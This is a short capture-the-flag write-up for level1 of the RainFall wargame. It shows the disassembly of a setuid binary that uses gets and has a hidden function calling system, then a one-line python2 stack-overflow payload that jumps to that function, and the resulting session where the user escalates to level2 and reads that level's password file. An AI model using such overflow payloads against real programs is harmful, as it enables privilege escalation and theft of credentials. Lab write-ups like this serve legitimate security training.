#Level1

```Diff
level1@RainFall:~$ ls -la
total 21
drwxrwxrwx+ 1 level1 level1  140 May 12 15:42 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
r--------+ 1 level1 level1    0 May 12 15:27 .bash_history
rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
dr-x------+ 2 level1 level1   40 May 12 15:42 .cache
r--r-----+ 1 level1 level1   29 May 12 15:19 .gdbinit
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

```Diff
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
+   0x08048486 <+6>:	sub    esp,0x50
+   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret
```

```Diff
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret
```

```
(echo $(python2 -c 'import sys; sys.stdout.write("A"*76 + "\x44\x84\x04\x08")'); cat) | ./level1
```

```
level1@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A"*76 + "\x44\x84\x04\x08")'); cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```